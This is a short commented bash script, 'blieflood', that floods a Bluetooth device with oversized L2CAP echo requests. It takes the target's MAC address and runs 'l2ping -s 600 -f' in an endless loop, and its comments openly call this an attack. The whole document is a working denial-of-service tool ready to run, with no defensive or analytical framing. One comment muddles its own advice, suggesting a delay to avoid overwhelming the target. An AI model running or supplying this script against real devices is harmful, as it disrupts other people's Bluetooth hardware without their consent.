#!/bin/bash

# Assign the first command-line argument to the variable 'target'. This will be the target Bluetooth MAC address.
target=$1

# Print a message to the console indicating the script name, version, and target.
echo "blieflood v 0.1 - flood on $target"

# Display detailed information about the Bluetooth controllers on the system using 'hciconfig -a'.
# This is useful for verifying the Bluetooth interface and its status.
hciconfig -a

# Pause the script for 5 seconds. This allows time for the Bluetooth interface to initialize or stabilize.
sleep 5

# Begin an infinite loop using 'while :'. This loop will continuously execute the l2ping flood.
while :
do
    # Use 'l2ping' to send L2CAP echo requests to the target Bluetooth MAC address.
    # '-s 600' sets the payload size to 600 bytes.
    # '-f' enables flood mode, sending requests continuously.
    l2ping -s 600 -f $target

    # Note:  There's no explicit error handling here.  l2ping's return code isn't checked.
    #       In a more robust script, you might want to check the return code of l2ping
    #       and potentially handle errors (e.g., if the target is unreachable).

    # Consider adding a small delay within the loop to avoid overwhelming the target
    # and potentially making the attack less effective.  For example:
    # sleep 0.1  # Wait for 0.1 seconds. Adjust as needed.

done

# To stop the script, you'll need to interrupt it manually (e.g., Ctrl+C).
